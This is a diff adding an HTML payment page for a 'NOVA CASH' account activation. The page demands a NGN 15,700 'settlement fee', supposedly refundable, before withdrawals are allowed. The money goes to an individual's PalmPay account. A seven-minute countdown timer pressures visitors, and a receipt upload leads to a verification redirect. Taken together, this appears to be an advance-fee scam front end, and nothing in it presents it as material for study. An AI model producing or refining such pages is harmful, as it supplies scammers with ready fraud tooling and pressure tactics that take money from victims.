@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Payment - NOVA CASH</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="payment.css">
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <svg class="header-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="5" width="20" height="14" rx="2" stroke="#10B981" stroke-width="2"/>
+            <path d="M2 9h20" stroke="#10B981" stroke-width="2"/>
+            <circle cx="18" cy="15" r="1" fill="#10B981"/>
+        </svg>
+        <h1 class="header-title">NOVA CASH ACTIVATION</h1>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="timer-container">
+            <svg class="clock-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="10" stroke="#FFA500" stroke-width="2"/>
+                <path d="M12 6v6l4 2" stroke="#FFA500" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            <span class="timer" id="timer">07:00</span>
+        </div>
+
+        <div class="payment-section">
+            <h2 class="section-title">Complete Your Payment</h2>
+            <p class="section-subtitle">Make a payment of 15,700 naira to activate your account</p>
+            <p class="section-description">
+                A settlement fee of NGN 15,700 is required to authorize withdrawals. This fee will be credited back with your withdrawal once authorized.
+            </p>
+        </div>
+
+        <div class="payment-details">
+            <h3 class="details-title">Payment Details</h3>
+            
+            <div class="detail-item">
+                <svg class="detail-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="8" r="4" stroke="#6B7280" stroke-width="2"/>
+                    <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" stroke="#6B7280" stroke-width="2"/>
+                </svg>
+                <span class="detail-label">Recipient:</span>
+                <span class="detail-value">JOHN LAWRENCE</span>
+            </div>
+
+            <div class="detail-item">
+                <svg class="detail-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="2" y="5" width="20" height="14" rx="2" stroke="#6B7280" stroke-width="2"/>
+                    <path d="M2 9h20" stroke="#6B7280" stroke-width="2"/>
+                </svg>
+                <span class="detail-label">Account Number:</span>
+                <span class="detail-value" id="accountNumber">701785 3915</span>
+                <button class="copy-button" onclick="copyAccountNumber()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="9" y="9" width="13" height="13" rx="2" stroke="#6B7280" stroke-width="2"/>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="#6B7280" stroke-width="2"/>
+                    </svg>
+                </button>
+            </div>
+
+            <div class="detail-item">
+                <svg class="detail-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="3" y="3" width="18" height="18" rx="2" stroke="#6B7280" stroke-width="2"/>
+                    <path d="M7 9h10M7 13h6" stroke="#6B7280" stroke-width="2"/>
+                </svg>
+                <span class="detail-label">Bank:</span>
+                <span class="detail-value">PALMPAY</span>
+            </div>
+
+            <div class="detail-item">
+                <span class="naira-icon">₦</span>
+                <span class="detail-label">Amount:</span>
+                <span class="detail-value">15,700</span>
+            </div>
+        </div>
+
+        <div class="upload-section">
+            <h3 class="upload-title">Upload Receipt</h3>
+            <div class="upload-area" id="uploadArea">
+                <input type="file" id="receiptUpload" accept="image/*,.pdf" style="display: none;">
+                <div class="upload-content">
+                    <svg class="upload-icon" width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5-5 5 5M12 5v12" stroke="#6B7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <p class="upload-text">Click to upload payment receipt</p>
+                    <p class="upload-hint">Supports JPG, PNG, PDF</p>
+                </div>
+            </div>
+        </div>
+
+        <button class="proceed-button" id="proceedButton">
+            <span class="button-text">I have made the payment</span>
+        </button>
+    </main>
+
+    <script>
+        // Timer countdown
+        let timeLeft = 7 * 60; // 7 minutes in seconds
+        const timerElement = document.getElementById('timer');
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                // Handle timeout
+                alert('Payment time has expired. Please refresh the page to try again.');
+            }
+        }
+
+        updateTimer();
+
+        // File upload handling
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('receiptUpload');
+
+        uploadArea.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const uploadContent = uploadArea.querySelector('.upload-content');
+                uploadContent.innerHTML = `
+                    <svg class="upload-icon" width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" stroke="#10B981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <polyline points="22 4 12 14.01 9 11.01" stroke="#10B981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <p class="upload-text">${file.name}</p>
+                    <p class="upload-hint">Receipt uploaded successfully</p>
+                `;
+                uploadArea.style.borderColor = '#10B981';
+            }
+        });
+
+        // Copy account number function
+        function copyAccountNumber() {
+            const accountNumber = document.getElementById('accountNumber').textContent.replace(/\s/g, '');
+            navigator.clipboard.writeText(accountNumber).then(() => {
+                const copyButton = document.querySelector('.copy-button');
+                copyButton.classList.add('copied');
+                copyButton.innerHTML = `
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <polyline points="20 6 9 17 4 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                `;
+                
+                setTimeout(() => {
+                    copyButton.classList.remove('copied');
+                    copyButton.innerHTML = `
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="9" y="9" width="13" height="13" rx="2" stroke="#6B7280" stroke-width="2"/>
+                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="#6B7280" stroke-width="2"/>
+                        </svg>
+                    `;
+                }, 2000);
+            });
+        }
+
+        // Proceed button
+        document.getElementById('proceedButton').addEventListener('click', () => {
+            if (!fileInput.files[0]) {
+                alert('Please upload your payment receipt first.');
+                return;
+            }
+            // Directly redirect to verification page
+            window.location.href = 'verification.html';
+        });
+    </script>
+</body>
+</html>
